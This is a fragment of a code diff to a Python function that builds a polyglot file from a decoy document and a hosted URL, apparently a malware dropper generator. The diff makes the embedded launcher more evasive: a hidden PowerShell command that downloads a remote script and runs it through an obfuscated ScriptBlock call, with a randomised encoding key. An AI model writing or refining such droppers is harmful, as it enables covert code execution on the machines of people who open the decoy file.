@@ -22,8 +22,17 @@ def build_polyglot(decoy_path: str, hosted_url: str, output_path: str) -> str:
         decoy_data = f.read()
 
     # Powershell launcher
-    ps = f"powershell -w hidden -ep bypass -c \"iwr '{hosted_url}'|iex\""
-    key = 91
+    ps = (
+        f"powershell -w hidden -ep bypass -c "
+        f"\"$a='{hosted_url}';"
+        f"$b=New-Object Net.WebClient;"
+        f"$d=$b.DownloadString($a);"
+        f"$s='Script'+'Block';"
+        f"&([type]$s)::Create($d)\""
+    )
+
+    # Encode PowerShell with XOR
+    key = random.randint(30, 120)
     encoded = [(ord(c) + key) % 256 for c in ps]
 
     # Random ID and Name
